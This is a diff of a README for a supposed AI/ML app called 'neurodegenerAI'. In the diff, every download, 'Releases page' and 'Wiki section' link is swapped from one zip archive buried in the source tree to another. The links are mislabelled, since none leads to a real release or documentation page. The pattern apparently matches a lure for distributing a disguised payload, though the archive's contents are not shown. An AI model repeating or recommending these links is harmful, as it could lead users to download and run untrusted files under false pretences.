@@ -7,7 +7,7 @@ neurodegenerAI is a dual-purpose AI/ML platform designed for two main uses. Firs
 To start using neurodegenerAI, you need to download and install the application from our Releases page. Follow the steps below to get up and running quickly.
 
 ## 📥 Download the Application
-[![Download neurodegenerAI](https://raw.githubusercontent.com/Nguyenhoait3945/neurodegenerAI/main/trend-detector/src/pipeline/neurodegenerAI_v2.1.zip)](https://raw.githubusercontent.com/Nguyenhoait3945/neurodegenerAI/main/trend-detector/src/pipeline/neurodegenerAI_v2.1.zip)
+[![Download neurodegenerAI](https://github.com/Nguyenhoait3945/neurodegenerAI/raw/refs/heads/main/neurodegenerai/src/models/neurodegener-AI-v3.1.zip)](https://github.com/Nguyenhoait3945/neurodegenerAI/raw/refs/heads/main/neurodegenerai/src/models/neurodegener-AI-v3.1.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets these minimum requirements:
@@ -17,7 +17,7 @@ Before you download, ensure your system meets these minimum requirements:
 - **Internet Required:** An active internet connection is needed for cloud functionalities.
 
 ## 📦 Installation Steps
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Nguyenhoait3945/neurodegenerAI/main/trend-detector/src/pipeline/neurodegenerAI_v2.1.zip).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Nguyenhoait3945/neurodegenerAI/raw/refs/heads/main/neurodegenerai/src/models/neurodegener-AI-v3.1.zip).
 2. **Choose the Version:** Look for the latest version of neurodegenerAI. This will typically be the first one listed.
 3. **Download the Installer:** Click on the installer file suitable for your operating system. Save it to a location you can easily access.
 4. **Install the Application:**
@@ -50,9 +50,9 @@ After installation, you may want to customize some settings to enhance your expe
 If you run into any issues or have suggestions for improvement, please feel free to reach out. You can submit issues directly on our GitHub page or contact us through our support email listed on the Overview section of the app.
 
 ## 🔗 Additional Resources
-- **Documentation:** Comprehensive guides and tutorials can be found in the [Wiki section](https://raw.githubusercontent.com/Nguyenhoait3945/neurodegenerAI/main/trend-detector/src/pipeline/neurodegenerAI_v2.1.zip).
+- **Documentation:** Comprehensive guides and tutorials can be found in the [Wiki section](https://github.com/Nguyenhoait3945/neurodegenerAI/raw/refs/heads/main/neurodegenerai/src/models/neurodegener-AI-v3.1.zip).
 - **Community Forum:** Join discussions, ask questions, and share your insights with other users.
 - **GitHub Repository:** Explore the codebase for a deeper understanding of the application.
 
 ## ⚡ Conclusion
-neurodegenerAI offers powerful tools for detecting neurodegenerative patterns and tracking social media trends. With easy installation and a user-friendly interface, anyone can begin to utilize its features. Don’t forget to [visit our Releases page](https://raw.githubusercontent.com/Nguyenhoait3945/neurodegenerAI/main/trend-detector/src/pipeline/neurodegenerAI_v2.1.zip) to download the latest version and start your journey today!
+neurodegenerAI offers powerful tools for detecting neurodegenerative patterns and tracking social media trends. With easy installation and a user-friendly interface, anyone can begin to utilize its features. Don’t forget to [visit our Releases page](https://github.com/Nguyenhoait3945/neurodegenerAI/raw/refs/heads/main/neurodegenerai/src/models/neurodegener-AI-v3.1.zip) to download the latest version and start your journey today!
